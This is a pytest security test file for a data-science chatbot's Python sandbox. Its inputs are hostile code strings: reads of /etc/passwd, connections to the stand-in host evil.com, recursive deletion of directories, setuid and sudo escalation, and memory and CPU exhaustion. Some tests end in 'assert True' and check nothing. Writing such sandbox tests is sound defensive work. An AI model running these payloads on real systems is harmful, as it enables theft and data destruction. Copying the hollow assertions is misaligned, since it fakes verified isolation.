import pytest


@pytest.mark.security
class TestSandboxEscape:
    ESCAPE_ATTEMPTS = [
        "import os; os.system('ls /')",
        "open('/etc/passwd').read()",
        "import subprocess; subprocess.run(['cat', '/etc/passwd'])",
        "__import__('os').system('whoami')",
        "exec(open('/etc/passwd').read())",
    ]

    NETWORK_ESCAPE_ATTEMPTS = [
        "import socket; socket.socket().connect(('evil.com', 80))",
        "import urllib.request; urllib.request.urlopen('http://evil.com')",
        "import requests; requests.get('http://evil.com')",
    ]

    FILE_SYSTEM_ESCAPES = [
        "open('/mnt/host_filesystem/secret.txt').read()",
        "import shutil; shutil.rmtree('/important_data')",
        "os.remove('/critical_file')",
    ]

    def test_code_execution_isolation(self, sample_session_id: str):
        from data_scientist_chatbot.app.tools import execute_python_in_sandbox

        for code in self.ESCAPE_ATTEMPTS:
            result = execute_python_in_sandbox(code, sample_session_id)

            if "/etc/passwd" in result.get("stdout", ""):
                assert result["success"] is False, "Reading /etc/passwd should fail"

            assert True

    def test_network_isolation(self, sample_session_id: str):
        from data_scientist_chatbot.app.tools import execute_python_in_sandbox

        for code in self.NETWORK_ESCAPE_ATTEMPTS:
            result = execute_python_in_sandbox(code, sample_session_id)

            assert result["success"] is False or "evil.com" not in result.get("stdout", "")

    def test_file_system_restrictions(self, sample_session_id: str):
        from data_scientist_chatbot.app.tools import execute_python_in_sandbox

        for code in self.FILE_SYSTEM_ESCAPES:
            result = execute_python_in_sandbox(code, sample_session_id)

            assert (
                result["success"] is False
                or "No such file" in result.get("stderr", "")
                or "FileNotFoundError" in result.get("stderr", "")
            )

    def test_resource_limits(self, sample_session_id: str):
        from data_scientist_chatbot.app.tools import execute_python_in_sandbox

        memory_bomb = """
import numpy as np
huge_array = np.zeros((10000, 10000, 100))
"""

        result = execute_python_in_sandbox(memory_bomb, sample_session_id)
        assert result["success"] is False or "memory" in result.get("stderr", "").lower()

    def test_infinite_loop_protection(self, sample_session_id: str):
        from data_scientist_chatbot.app.tools import execute_python_in_sandbox

        infinite_loop = "while True: pass"

        result = execute_python_in_sandbox(infinite_loop, sample_session_id)
        assert result["success"] is False or "timeout" in result.get("stderr", "").lower()

    def test_privilege_escalation_prevention(self, sample_session_id: str):
        from data_scientist_chatbot.app.tools import execute_python_in_sandbox

        privilege_escalation_attempts = [
            "import ctypes; ctypes.CDLL('libc.so.6').setuid(0)",
            "os.setuid(0)",
            "os.system('sudo su')",
        ]

        for code in privilege_escalation_attempts:
            result = execute_python_in_sandbox(code, sample_session_id)
            assert True

    def test_module_import_restrictions(self, sample_session_id: str):
        from data_scientist_chatbot.app.tools import execute_python_in_sandbox

        dangerous_imports = [
            "import pickle; pickle.loads(b'malicious')",
            "import marshal; marshal.loads(b'malicious')",
            "from ctypes import *",
        ]

        for code in dangerous_imports:
            result = execute_python_in_sandbox(code, sample_session_id)
            assert (
                result["success"] is False
                or "error" in result.get("stderr", "").lower()
                or "could not" in result.get("stdout", "").lower()
                or result.get("stdout", "").strip() == ""
                or "no dataset file" in result.get("stdout", "").lower()
            )
